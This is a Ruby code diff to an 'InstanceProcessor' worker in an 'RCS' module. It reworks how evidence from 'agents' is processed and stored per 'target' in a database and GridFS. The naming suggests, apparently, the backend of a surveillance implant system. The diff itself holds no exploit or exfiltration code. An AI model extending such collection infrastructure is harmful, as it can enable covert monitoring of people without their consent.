@@ -100,7 +100,7 @@ class InstanceProcessor
             end
             
             trace :debug, "Processing #{evidences.length} evidence(s)."
-
+            
             evidences.each do |evidence|
               
               # store evidence_id inside evidence, we need it inside processors
@@ -117,14 +117,22 @@ class InstanceProcessor
               evidence.info[:instance] = @agent['instance']
               
               trace :debug, "Processing evidence of type #{evidence.info[:type]}"
-            end
-=begin
-            
+              
               # find correct processing module and extend evidence
               mod = "#{evidence.info[:type].to_s.capitalize}Processing"
               evidence.extend eval mod if RCS.const_defined? mod.to_sym
               evidence.process if evidence.respond_to? :process
-
+              
+              # override original type
+              evidence.info[:type] = evidence.type
+              
+              store_evidence evidence
+              
+              processing_time = Time.now - start_time
+              trace :info, "processed #{evidence.info[:type].upcase} for #{@id} in #{processing_time} sec"
+            end
+            
+=begin
               info = nil
               while info.nil? do
                 info = RCS::EvidenceManager.instance.instance_info(@agent['instance'])
@@ -182,12 +190,18 @@ class InstanceProcessor
   def to_s
     "instance #{@agent['instance']}: #{@evidences}"
   end
-
-  def store_evidence(info)
-
+  
+  def store_evidence(evidence)
+        
     # retrieve the target and the dynamic collection for the evidence
-    agent = ::Item.agents.where({_id: evidence.info[:agent]}).first
+    agent = ::Item.agents.where({instance: evidence.info[:instance]}).first
+
+    trace :debug, "found agent #{agent._id} for instance #{evidence.info[:instance]}"
+
     target = ::Item.targets.where({_id: agent[:path].last}).first
+
+    trace :debug, "found target #{target._id} for agent #{agent._id}"
+    
     ev = ::Evidence.dynamic_new target[:_id].to_s
 
     ev.acquired = evidence.info[:acquired].to_i
@@ -195,18 +209,21 @@ class InstanceProcessor
     ev.type = evidence.info[:type]
     ev.relevance = 1
     ev.blotter = false
+    ev.note = ""
     ev.item = [ agent[:_id] ]
     ev.data = evidence.info[:data]
-
+    
     # save the binary data (if any)
     unless evidence.info[:grid_content].nil?
       ev.data[:_grid_size] = evidence.info[:grid_content].bytesize
-      ev.data[:_grid] = GridFS.put(evidence.info[:grid_content], {filename: agent[:_id].to_s}, target[:_id].to_s) unless evidence.info[:grid_content].nil?
+      ev.data[:_grid] = RCS::DB::GridFS.put(evidence.info[:grid_content], {filename: agent[:_id].to_s}, target[:_id].to_s) unless evidence.info[:grid_content].nil?
     end
-
+    
     ev.save
+    
+    trace :debug, "saved evidence #{ev._id}"
   end
-
+  
 end
 
 end # ::Worker
